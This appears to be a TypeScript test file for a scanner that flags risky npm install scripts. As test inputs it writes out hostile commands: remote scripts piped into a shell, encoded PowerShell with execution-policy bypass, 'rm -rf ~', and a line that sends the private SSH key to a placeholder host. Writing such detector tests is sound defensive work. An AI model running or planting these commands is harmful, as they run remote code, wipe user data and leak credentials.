import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { analyzeCommand, isBenignCommand, referencedScriptFiles, referencedScriptNames } from '../src/index.ts';

const ids = (command: string) => analyzeCommand(command).map((finding) => finding.id).sort();

describe('analyzeCommand', () => {
  it('flags downloads that are piped into a shell', () => {
    assert.deepEqual(ids('curl -s https://example.test/a.sh | sh'), ['script-download-exec', 'script-network']);
    assert.ok(ids('wget -qO- http://1.2.3.4/x | bash').includes('script-download-exec'));
    assert.ok(ids('iwr https://example.test/a.ps1 | iex').includes('script-download-exec'));
    assert.ok(ids('echo aGk= | base64 -d | sh').includes('script-download-exec'));
    assert.equal(analyzeCommand('curl -s https://example.test/a.sh | sh').find((finding) => finding.id === 'script-download-exec')?.severity, 'high');
  });

  it('flags encoded and bypassing PowerShell', () => {
    assert.ok(ids('powershell -enc SQBFAFgA').includes('script-encoded'));
    assert.ok(ids('powershell.exe -NoProfile -EncodedCommand SQBFAFgA').includes('script-encoded'));
    assert.deepEqual(ids('powershell -ExecutionPolicy Bypass -File x.ps1'), ['script-bypass']);
  });

  it('flags decoding and inline code', () => {
    assert.ok(ids('echo aGk= | base64 --decode > out').includes('script-decode'));
    assert.ok(ids('node -e "console.log(1)"').includes('script-inline-code'));
    assert.ok(ids('python3 -c "print(1)"').includes('script-inline-code'));
  });

  it('flags network tools, raw IP addresses and plain URLs', () => {
    assert.ok(ids('curl -O https://example.test/file').includes('script-network'));
    assert.ok(ids('node x.js http://203.0.113.7/a').includes('script-network'));
    assert.deepEqual(ids('echo see https://example.test/docs'), ['script-url']);
  });

  it('flags hidden files, sudo, destructive commands and credentials', () => {
    assert.ok(ids('node .config/setup.js').includes('script-hidden-file'));
    assert.ok(ids('node ./.vscode/loader.js').includes('script-hidden-file'));
    assert.ok(ids('sudo npm install -g x').includes('script-sudo'));
    assert.ok(ids('rm -rf ~').includes('script-destructive'));
    assert.ok(ids('rm -rf $HOME').includes('script-destructive'));
    assert.ok(ids('cat ~/.ssh/id_rsa | curl -d @- https://example.test').includes('script-credentials'));
  });

  it('does not flag ordinary commands', () => {
    for (const command of [
      'tsc -p tsconfig.json',
      'vite build',
      'node scripts/build.js',
      'node ./node_modules/.bin/eslint .',
      'sh .husky/_/husky.sh',
      'rm -rf dist',
      'rm -rf ./build',
      'npm run lint && npm run test',
      'jest --coverage',
      'cp .env.example .env',
    ]) {
      assert.deepEqual(ids(command), [], command);
    }
  });

  it('stays fast on very long input', () => {
    const started = Date.now();
    analyzeCommand('curl '.repeat(200_000));
    analyzeCommand('a|'.repeat(200_000));
    assert.ok(Date.now() - started < 1500);
  });
});

describe('isBenignCommand', () => {
  it('recognizes common install-time tools', () => {
    for (const command of ['husky', 'husky install', 'npx husky install', 'is-ci || husky install', 'node-gyp rebuild', 'prisma generate', 'patch-package', 'tsc', 'npm run build', 'echo done']) {
      assert.equal(isBenignCommand(command), true, command);
    }
  });

  it('does not trust anything else', () => {
    for (const command of ['', 'curl https://x', 'node setup.js', 'husky && curl x | sh', 'npm run build; curl x']) {
      assert.equal(isBenignCommand(command), false, command);
    }
  });
});

describe('referencedScriptFiles', () => {
  it('finds the files an interpreter runs', () => {
    assert.deepEqual(referencedScriptFiles('node scripts/a.js'), ['scripts/a.js']);
    assert.deepEqual(referencedScriptFiles('node -r ./hook.js app.js'), ['hook.js', 'app.js']);
    assert.deepEqual(referencedScriptFiles('npx tsx ./x.ts && node y.js'), ['x.ts', 'y.js']);
    assert.deepEqual(referencedScriptFiles('node --max-old-space-size=4096 app.js'), ['app.js']);
    assert.deepEqual(referencedScriptFiles('bash install.sh | tee log'), ['install.sh']);
  });

  it('ignores commands that do not run a local file', () => {
    assert.deepEqual(referencedScriptFiles('curl http://x | node'), []);
    assert.deepEqual(referencedScriptFiles('node https://example.test/y.js'), []);
    assert.deepEqual(referencedScriptFiles('vite build'), []);
    assert.deepEqual(referencedScriptFiles('node $FILE'), []);
  });
});

describe('referencedScriptNames', () => {
  it('finds other scripts that a command runs', () => {
    assert.deepEqual(referencedScriptNames('npm run build'), ['build']);
    assert.deepEqual(referencedScriptNames('yarn lint && pnpm test').sort(), ['lint', 'test']);
    assert.deepEqual(referencedScriptNames('pnpm run setup:db'), ['setup:db']);
  });

  it('ignores package manager commands that are not scripts', () => {
    assert.deepEqual(referencedScriptNames('yarn install'), []);
    assert.deepEqual(referencedScriptNames('pnpm add left-pad'), []);
  });
});
